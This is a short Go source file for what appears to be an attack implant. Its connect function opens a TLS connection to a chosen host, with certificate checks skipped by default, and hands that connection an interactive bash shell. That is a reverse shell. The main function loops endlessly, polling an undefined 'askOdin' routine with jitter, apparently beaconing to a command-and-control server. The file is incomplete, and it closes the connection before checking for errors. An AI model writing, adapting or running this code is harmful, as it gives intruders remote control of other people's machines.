package main

import (
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"github.com/spf13/cobra"
	"log"
	"os"
	"os/exec"
	"os/user"
	"time"
)

func main() {
	rootCmd := &cobra.Command{
		Use: "main",
		Run: func(cmd *cobra.Command, args []string) {
			host, _ := cmd.Flags().GetString("host")
			port, _ := cmd.Flags().GetInt("port")
			shell, _ := cmd.Flags().GetString("shell")
			insecure, _ := cmd.Flags().GetBool("insecure")
			connect(host, port, shell, insecure)
		},
	}
	rootCmd.Flags().StringP("host", "H", "localhost", "Server host")
	rootCmd.Flags().IntP("port", "P", 1234, "Server port")
	rootCmd.Flags().StringP("shell", "S", "/bin/bash", "User shell")
	rootCmd.Flags().BoolP("insecure", "i", true, "Skip certificate verification (not recommended)")
	//rootCmd.Execute()
	for {
		odin := askOdin()
		color.Green("Odin: %v", odin)
		time.Sleep(time.Duration(odin.Jitter) * time.Second)
	}
}

func connect(host string, port int, shell string, insecure bool) {
	log.Printf("Connecting to %s:%d...\n", host, port)

	tlsConfig := &tls.Config{
		InsecureSkipVerify: insecure,
	}

	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), tlsConfig)
	defer conn.Close()
	if err != nil {
		log.Printf("Error connecting to server: %s\n", err)
		return
	}

	currentUser, _ := user.Current()
	currentDir, _ := os.Getwd()

	command := exec.Command(shell, "-i")
	command.Env = append(os.Environ(),
		fmt.Sprintf("PS1=[\\u@\\h \\w]\\$ "),
		fmt.Sprintf("USER=%s", currentUser.Username),
		fmt.Sprintf("PWD=%s", currentDir),
	)

	command.Stdout = conn
	command.Stderr = conn
	command.Stdin = conn
	command.Run()
}
